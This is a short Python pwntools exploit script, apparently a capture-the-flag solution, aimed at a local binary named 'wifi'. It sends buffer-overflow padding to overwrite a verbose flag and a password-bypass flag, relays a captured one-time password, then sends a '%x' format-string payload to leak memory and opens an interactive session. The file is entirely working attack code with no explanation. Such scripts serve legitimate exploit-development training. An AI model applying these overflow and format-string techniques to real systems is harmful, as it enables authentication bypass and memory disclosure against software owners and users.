from pwn import *

io = process("./wifi")

activate_verbose = b"A"*10 + b"ON" # Payload 1: Overwrite VERBOSE

bypass_password = b"A"*20 + b"TRUE" # Payload 2: Overwrite BYPASS

io.sendline(activate_verbose)
io.sendline(bypass_password)

otp = io.recvline_contains(b"X")

io.sendlineafter(b" ", otp)

format_string = b"%x"*25
io.sendline(format_string)
io.interactive()
